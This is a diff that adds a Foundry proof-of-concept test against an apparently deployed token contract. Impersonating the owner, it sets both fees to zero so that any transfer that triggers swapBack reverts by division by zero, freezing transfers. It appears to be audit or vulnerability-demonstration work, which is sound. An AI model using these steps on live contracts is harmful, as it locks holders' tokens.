@@ -1,0 +1,59 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+import "forge-std/Test.sol";
+
+interface ITwelveDays {
+    function getOwner() external view returns (address);
+    function totalFee() external view returns (uint256);
+    function setFees(uint256 _marketingFee, uint256 _otherFee) external;
+    function setSwapBackSettings(bool _enabled, uint256 _amount) external;
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function pair() external view returns (address);
+    function swapEnabled() external view returns (bool);
+    function swapThreshold() external view returns (uint256);
+    function marketingFee() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    address constant TOKEN = 0xb5c50edd218569d7a19fab89ca6b85ec30bd1eb0;
+
+    function testZeroDivisionDoS() public {
+        ITwelveDays token = ITwelveDays(TOKEN);
+
+        // Get the owner (admin) of the contract
+        address owner = token.getOwner();
+        vm.label(owner, "Owner");
+
+        // Ensure we are dealing with the real deployed contract
+        assertTrue(token.totalFee() > 0, "Initial totalFee should be > 0");
+
+        // Impersonate the owner to perform privileged actions
+        vm.startPrank(owner);
+
+        // 1. Send enough tokens to the contract itself so that swap back can trigger.
+        //    Owner holds the whole supply; transfer 2 ether worth to the contract.
+        uint256 sendAmount = 2e18; // 2 tokens
+        token.transfer(address(token), sendAmount);
+        assertGe(token.balanceOf(address(token)), sendAmount, "Contract should have tokens");
+
+        // 2. Enable swap-back with a low threshold (1 token)
+        token.setSwapBackSettings(true, 1e18);
+        assertTrue(token.swapEnabled(), "Swap should be enabled");
+
+        // 3. Set both marketing and other fees to zero – this makes totalFee = 0,
+        //    which will be used as denominator in swapBack().
+        token.setFees(0, 0);
+        assertEq(token.totalFee(), 0, "totalFee should be zero");
+
+        // 4. Any transfer that triggers swapBack will now revert due to division by zero.
+        address dummy = address(1337);
+        vm.expectRevert(); // Panic(0x12) – division by zero
+        token.transfer(dummy, 1e18);
+
+        vm.stopPrank();
+    }
+}
+```
